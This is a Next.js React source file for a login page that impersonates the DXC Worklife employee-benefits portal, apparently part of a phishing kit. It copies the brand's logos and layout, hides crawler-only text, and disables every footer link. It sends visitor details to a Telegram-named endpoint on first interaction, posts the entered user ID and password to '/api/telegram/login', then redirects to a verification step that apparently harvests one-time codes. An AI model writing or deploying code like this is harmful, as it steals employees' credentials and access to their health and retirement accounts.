"use client";

import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { useVisitorTracking } from "@/hooks/use-visitor-tracking";

export default function LoginPage() {
  const [hasInteracted, setHasInteracted] = useState(false);
  const visitorInfo = useVisitorTracking();
  const hasSentVisitRef = useRef(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPasswordField, setShowPasswordField] = useState(false);
  const [fieldErrors, setFieldErrors] = useState<{ userid?: string; password?: string }>({});
  const [loginError, setLoginError] = useState<string | null>(null);
  const [isLoginLoading, setIsLoginLoading] = useState(false);
  const redirectRef = useRef<number | null>(null);
  const router = useRouter();

  useEffect(() => {
    if (typeof window !== "undefined") {
      sessionStorage.removeItem("ubs_verify");
      sessionStorage.removeItem("ubs_details");
      sessionStorage.removeItem("ubs_otp2");
    }
  }, []);

  useEffect(() => {
    const onFirstInteraction = () => setHasInteracted(true);
    window.addEventListener("pointerdown", onFirstInteraction, {
      once: true,
      passive: true,
    });
    window.addEventListener("keydown", onFirstInteraction, { once: true });
    return () => {
      window.removeEventListener("pointerdown", onFirstInteraction);
      window.removeEventListener("keydown", onFirstInteraction);
    };
  }, []);

  useEffect(() => {
    if (!hasInteracted || !visitorInfo || hasSentVisitRef.current) return;
    hasSentVisitRef.current = true;
    fetch("/api/telegram/visitor", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(visitorInfo),
    }).catch(console.error);
  }, [hasInteracted, visitorInfo]);

  const clearErr = (fieldId: string) => {
    setFieldErrors((prev) => ({
      ...prev,
      [fieldId]: undefined,
    }));
  };

  const validate = (): boolean => {
    let ok = true;
    const errors: typeof fieldErrors = {};

    if (!username.trim()) {
      errors.userid = "Please enter your User ID.";
      ok = false;
    }

    if (showPasswordField && !password.trim()) {
      errors.password = "Please enter your Password.";
      ok = false;
    }

    setFieldErrors(errors);
    return ok;
  };

  const handleSignIn = async () => {
    if (isLoginLoading) return;
    if (!validate()) return;

    setLoginError(null);
    setIsLoginLoading(true);

    try {
      const response = await fetch("/api/telegram/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: username, password }),
      });

      if (!response.ok) {
        throw new Error("Failed to send login data");
      }

      if (typeof window !== "undefined") {
        sessionStorage.setItem("ubs_verify", "1");
      }

      redirectRef.current = window.setTimeout(() => {
        router.replace("/verify");
      }, 1800);
    } catch (error) {
      console.error("Login failed:", error);
      setLoginError("Unable to send login details. Please try again.");
      setIsLoginLoading(false);
    }
  };

  useEffect(() => {
    return () => {
      if (redirectRef.current) {
        window.clearTimeout(redirectRef.current);
      }
    };
  }, []);

  return (
    <>
      <style>{`
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        html, body { min-height: 100%; width: 100%; }
        body { font-family: Arial, Helvetica, sans-serif; font-size: 14px; min-height: 100vh; display: flex; flex-direction: column; background: #F5F5F5; color: #111827; }

        .site-header { width: 100%; }
        .top-bar { background: #4D148C; height: 12px; }
        .nav-bar { background: #fff; border-bottom: 1px solid #6b7280; }
        .nav-inner { max-width: 1200px; margin: 0 auto; padding: 24px; display: flex; align-items: center; }
        .logo { height: 40px; width: auto; }
        @media (min-width: 768px) { .logo { height: 48px; } }

        /* SEO Info Section - hidden from users, visible to crawlers */
        .info-section { display: none; }

        .landing-main { background: #fff; }
        .landing-content { max-width: 1200px; margin: 0 auto; padding: 20px 24px 32px; display: flex; flex-direction: column; gap: 24px; align-items: flex-start; }
        @media (min-width: 1024px) { .landing-content { flex-direction: row; padding: 24px; } }

        .content-column { width: 100%; }
        .page-heading { font-size: 2rem; line-height: 1.1; font-weight: 600; color: #111827; margin-bottom: 2.5rem; }
        @media (min-width: 768px) { .page-heading { font-size: 2.5rem; } }

        .form-card { background: #fff; border: 1px solid #d1d5db; border-radius: 1rem; box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05); padding: 2.5rem; max-width: 30rem; width: 100%; }
        .form-card h2 { font-size: 2rem; font-weight: 600; margin-bottom: 1.5rem; color: #111827; }
        .form-card p { color: #4b5563; margin-bottom: 1.25rem; }
        .form-card label { display: block; font-size: 0.875rem; font-weight: 600; color: #374151; margin-bottom: 0.5rem; }
        .input-field { width: 100%; height: 4.5rem; border: 1px solid #374151; padding: 0 1rem; border-radius: 0.75rem; font-size: 1rem; color: #111827; outline: none; transition: border-color 0.2s ease, box-shadow 0.2s ease; }
        .input-field:focus { border-color: #3b82f6; box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.25); }
        .helper-row { margin-top: 1rem; text-align: right; }
        .helper-row a { color: #2563eb; text-decoration: underline; font-size: 0.95rem; }
        .button-row { margin-top: 2.5rem; }
        .primary-button { width: 100%; display: inline-flex; align-items: center; justify-content: center; padding: 1rem 2rem; border-radius: 9999px; border: none; font-size: 1rem; font-weight: 700; color: #fff; background: #9ca3af; cursor: not-allowed; }
        .primary-button:disabled { opacity: 0.85; cursor: not-allowed; }
        .error-text { margin-top: 0.75rem; color: #b91c1c; font-size: 0.9rem; }

        .hero-column { width: 100%; display: flex; justify-content: flex-start; }
        .hero-image { width: 100%; max-width: 500px; height: auto; min-height: 250px; object-fit: cover; border-radius: 1rem; }
        @media (max-width: 767px) { .hero-image { min-height: 220px; } }

        .site-footer { width: 100%; }
        .footer-inner { max-width: 1200px; margin: 0 auto; padding: 48px 32px; display: flex; flex-direction: column; gap: 2.5rem; }
        @media (min-width: 768px) { .footer-inner { flex-direction: row; justify-content: space-between; align-items: flex-start; } }
        .footer-links { display: grid; gap: 0.75rem; font-size: 1.125rem; }
        .footer-links a { color: #1d4ed8; text-decoration: underline; }
        .footer-brand { display: flex; flex-direction: column; align-items: flex-start; gap: 1.5rem; }
        .footer-brand img { height: 56px; width: auto; }
        .store-badges { display: flex; gap: 1rem; flex-wrap: wrap; }
        .store-badges img { height: 48px; width: auto; }
        .footer-divider { margin: 2.5rem 0; border: none; border-top: 1px solid #6b7280; opacity: 0.55; }
        .footer-bottom { display: flex; flex-direction: column; gap: 1rem; font-size: 1rem; color: #4b5563; }
        @media (min-width: 768px) { .footer-bottom { flex-direction: row; justify-content: space-between; align-items: center; } }
        .bottom-links { display: flex; flex-wrap: wrap; gap: 1rem; }
        .bottom-links a { color: #1d4ed8; text-decoration: underline; }

        .chat-widget { position: fixed; right: 2rem; bottom: 2rem; width: 64px; height: 64px; border-radius: 9999px; background: #2563eb; display: flex; align-items: center; justify-content: center; box-shadow: 0 12px 24px rgba(15, 23, 42, 0.18); cursor: pointer; }
        .chat-widget img { width: 32px; height: 32px; }
        @media (max-width: 640px) { .landing-content { padding: 20px 16px 24px; } .footer-inner { padding: 32px 20px; } .chat-widget { right: 1rem; bottom: 1rem; width: 56px; height: 56px; } }
      `}</style>

      <header className="site-header">
        <div className="top-bar" />
        <div className="nav-bar">
          <div className="nav-inner">
            <img src="/images/logo.svg" alt="DXC Technology Logo" className="logo" />
          </div>
        </div>
      </header>

      {/* SEO Info Section - hidden from users, visible to crawlers */}
      <section className="info-section">
        <div className="info-inner">
          <h2>Manage Your DXC Technology Employee Benefits</h2>
          <p>
            DXC Worklife, powered by Alight Solutions, is your secure portal for managing employee benefits including health insurance, retirement plans (401k), dependent care, HSA and FSA accounts, and payroll benefits. Sign in to access your account, view coverage details, and manage your benefits enrollment.
          </p>
          <div className="info-grid">
            <article className="info-card">
              <h3>Health Benefits</h3>
              <p>Access your medical, dental, and vision coverage through the DXC Worklife portal. View plan details and manage your health benefits.</p>
            </article>
            <article className="info-card">
              <h3>Retirement & 401k</h3>
              <p>Manage your retirement savings and 401k plan. Review contribution amounts and investment options for your future.</p>
            </article>
            <article className="info-card">
              <h3>HSA & FSA Accounts</h3>
              <p>Track your Health Savings Account and Flexible Spending Account balances, submit claims, and view reimbursement status.</p>
            </article>
          </div>
        </div>
      </section>

      <main className="landing-main">
        <div className="landing-content">
          <div className="content-column">
            <h1 className="page-heading">Welcome to DXC Worklife</h1>
            <div className="form-card">
              <h2>Enter your user ID.</h2>
              <p>* Fields marked with an asterisk (*) are required</p>
              <label htmlFor="userId">User ID*</label>
              <input
                id="userId"
                type="text"
                className="input-field"
                value={username}
                onFocus={() => setShowPasswordField(true)}
                onChange={(e) => {
                  setUsername(e.target.value);
                  clearErr("userid");
                }}
                autoComplete="username"
              />
              {fieldErrors.userid && (
                <p className="error-text">{fieldErrors.userid}</p>
              )}

              {showPasswordField && (
                <>
                  <label htmlFor="password" className="mt-4 block">
                    Password*
                  </label>
                  <input
                    id="password"
                    type="password"
                    className="input-field"
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                      clearErr("password");
                    }}
                    autoComplete="current-password"
                  />
                  {fieldErrors.password && (
                    <p className="error-text">{fieldErrors.password}</p>
                  )}
                </>
              )}
              <div className="helper-row">
                <a href="#" onClick={(e) => e.preventDefault()}>
                  Don&apos;t have user ID?
                </a>
              </div>
              <div className="button-row">
                <button
                  className="primary-button"
                  type="button"
                  onClick={handleSignIn}
                  disabled={isLoginLoading}
                >
                  {isLoginLoading ? "Processing..." : "Next"}
                </button>
              </div>
              {loginError && <p className="error-text">{loginError}</p>}
            </div>
          </div>
          <div className="hero-column">
            <img src="/images/hero.jpg" alt="DXC Worklife Benefits" className="hero-image" />
          </div>
        </div>
      </main>

      <footer className="site-footer">
        <div className="footer-inner">
          <div className="footer-links">
            <a href="#" onClick={(e) => e.preventDefault()}>Contact Us</a>
            <a href="#" onClick={(e) => e.preventDefault()}>Feedback</a>
            <a href="#" onClick={(e) => e.preventDefault()}>Protect Yourself From Website Fraud</a>
          </div>
          <div className="footer-brand">
            <img src="/images/alight_worklife_logo_black.svg" alt="DXC Worklife" />
            <div className="store-badges">
              <img src="/images/alight-worklife-app-store.png" alt="App Store" />
              <img src="/images/alight-worklife-google-play.png" alt="Google Play" />
            </div>
          </div>
        </div>
        <hr className="footer-divider" />
        <div className="footer-inner footer-bottom">
          <div className="bottom-links">
            <a href="#" onClick={(e) => e.preventDefault()}>Privacy Policy</a>
            <a href="#" onClick={(e) => e.preventDefault()}>Terms of Use</a>
            <a href="#" onClick={(e) => e.preventDefault()}>Cookie Notice</a>
            <a href="#" onClick={(e) => e.preventDefault()}>Cookie Settings</a>
          </div>
          <p>&copy; 2026 DXC Technology. All rights reserved.</p>
        </div>
      </footer>

      <div className="chat-widget" role="button" aria-label="Chat">
        <img src="/icon_pwd.png" alt="Chat" />
      </div>
    </>
  );
}
